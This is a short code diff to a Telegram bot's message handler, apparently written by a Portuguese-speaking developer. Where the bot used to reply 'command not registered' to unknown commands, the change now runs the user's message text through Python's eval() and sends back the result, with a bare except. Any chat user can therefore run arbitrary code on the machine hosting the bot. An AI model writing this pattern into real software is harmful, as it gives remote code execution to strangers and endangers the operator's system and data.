@@ -54,8 +54,11 @@ def handle(msg):
         bot.sendMessage(chat_id, imagensRandom())
 
     else:
-        bot.sendMessage(chat_id, "Comando não cadastrado")
-        
+        try:
+            bot.sendMessage(chat_id, eval(command))
+        except:
+            bot.sendMessage(chat_id, "Comando não cadastrado")
+
     print(usuario, dataMensagem)
     GravarLog(so, dataMensagem, usuario, command) #Sempre quando enviar uma mensagem será gravado um log
 
